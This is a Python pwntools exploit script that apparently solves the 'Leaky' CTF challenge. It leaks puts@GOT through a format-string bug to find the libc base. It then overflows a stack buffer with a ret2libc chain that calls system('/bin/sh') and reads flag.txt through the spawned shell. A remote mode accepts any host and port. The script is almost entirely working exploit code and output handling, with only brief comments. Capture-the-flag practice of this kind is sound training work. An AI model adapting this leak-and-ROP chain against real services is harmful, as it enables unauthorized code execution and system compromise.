#!/usr/bin/env python3
"""
Leaky (Kali Team CTF 26) — format-string leak + ret2libc

Vulns in one function:
  read(0, buf[0x10], 0x60)  -> stack BOF
  printf(buf)               -> format string

Protections: Full RELRO, no canary, NX, no PIE.

Plan:
  1) %7$s leak puts@GOT (buffer starts at fmt arg $6)
  2) ret (align) + challenge  for a second input (stack must stay 16-byte aligned)
  3) ret2libc: system("/bin/sh")

Local:
  python3 solve/solve.py

Remote:
  python3 solve/solve.py remote HOST PORT
"""
from __future__ import annotations

import sys
from pathlib import Path

from pwn import *

HERE = Path(__file__).resolve().parent
CANDS = [
    HERE.parent / "files" / "player" / "leaky",
    Path.cwd() / "leaky",
]
BIN = next(p for p in CANDS if p.exists())
WORKDIR = BIN.parent

context.arch = "amd64"
context.bits = 64
context.binary = elf = ELF(str(BIN), checksec=False)
context.log_level = "info"
libc = ELF(str(WORKDIR / "libc.so.6"), checksec=False)

# buf at [rbp-0x10] -> RIP at +0x18; we use 0x10 pad + saved RBP + chain
FAKE_RBP = 0x404500  # writable (bss-ish)
RET_BIN = 0x40101A  # ret; for 16-byte stack alignment when ret2challenge
POP_RDI_OFF = 0x2A3E5  # pop rdi; ret in provided libc


def start(argv: list[str]):
    if len(argv) >= 4 and argv[1] == "remote":
        return remote(argv[2], int(argv[3]))
    ld = WORKDIR / "ld-linux-x86-64.so.2"
    return process(
        [str(ld), "--library-path", str(WORKDIR), str(BIN)],
        cwd=str(WORKDIR),
    )


def main(argv: list[str]) -> int:
    io = start(argv)

    # --- stage 1: leak puts@GOT + aligned ret to challenge ---
    fmt = b"%7$s".ljust(8, b"A")  # $6 = first qword of buf, $7 = second
    payload1 = (
        fmt
        + p64(elf.got["puts"])
        + p64(FAKE_RBP)
        + p64(RET_BIN)
        + p64(elf.symbols["challenge"])
    )
    io.recvuntil(b"input:")
    io.sendline(payload1)

    data = io.recvuntil(b"input:", timeout=3)
    log.info(f"stage1 raw: {data!r}")
    body = data.split(b"\n", 1)[-1].split(b"Welcome")[0]
    leak = body.split(b"AAAA")[0] if b"AAAA" in body else body[:8]
    puts_addr = u64(leak.ljust(8, b"\x00")[:8])
    libc.address = puts_addr - libc.symbols["puts"]
    log.success(f"puts={hex(puts_addr)} libc={hex(libc.address)}")

    pop_rdi = libc.address + POP_RDI_OFF
    ret = pop_rdi + 1  # trailing c3 of 5f c3
    system = libc.symbols["system"]
    binsh = next(libc.search(b"/bin/sh\x00"))

    # --- stage 2: system("/bin/sh") ---
    payload2 = (
        b"B" * 0x10
        + p64(FAKE_RBP)
        + p64(ret)
        + p64(pop_rdi)
        + p64(binsh)
        + p64(system)
    )
    io.sendline(payload2)
    io.sendline(b"echo SHELL_OK; cat flag.txt; exit")
    out = io.recvall(timeout=3)
    sys.stdout.buffer.write(out if out.endswith(b"\n") else out + b"\n")
    io.close()
    return 0 if (b"SHELL_OK" in out or b"KaliTeam{" in out) else 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
